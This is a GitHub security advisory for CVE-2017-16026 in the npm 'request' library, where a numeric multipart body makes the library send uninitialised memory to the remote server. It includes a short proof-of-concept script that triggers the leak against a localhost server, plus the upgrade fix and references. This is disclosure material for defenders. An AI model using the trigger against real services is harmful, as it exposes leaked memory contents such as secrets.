# [M] Remote Memory Exposure in request

## Summary
Severity: Medium
Advisory: GHSA-7xfp-9c55-5vqj
CVE: CVE-2017-16026
CWE: CWE-201
Ecosystem: npm
CVSS: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2018-11-09
Source: https://github.com/advisories/GHSA-7xfp-9c55-5vqj
Type: github-advisory

## Affected
- npm: `request` — affected >=2.49.0 <2.68.0
- npm: `request` — affected >=2.2.6 <2.68.0

## Details
Affected versions of `request` will disclose local system memory to remote systems in certain circumstances. When a multipart request is made, and the type of `body` is `number`, then a buffer of that size will be allocated and sent to the remote server as the body.

## Proof of Concept

```js
var request = require('request');
var http = require('http');

var serveFunction = function (req, res){
	req.on('data', function (data) {
            console.log(data)
        });
	res.end();
};
var server = http.createServer(serveFunction);
server.listen(8000);

request({
	method: "POST",
	uri: 'http://localhost:8000',
	multipart: [{body:500}]
},function(err,res,body){});
```


## Recommendation

Update to version 2.68.0 or later

## References
- https://nvd.nist.gov/vuln/detail/CVE-2017-16026
- https://github.com/request/request/issues/1904
- https://github.com/request/request/pull/2018
- https://github.com/request/request/pull/2022
- https://github.com/request/request/commit/29d81814bc16bc79cb112b4face8be6fc00061dd
- https://github.com/request/request
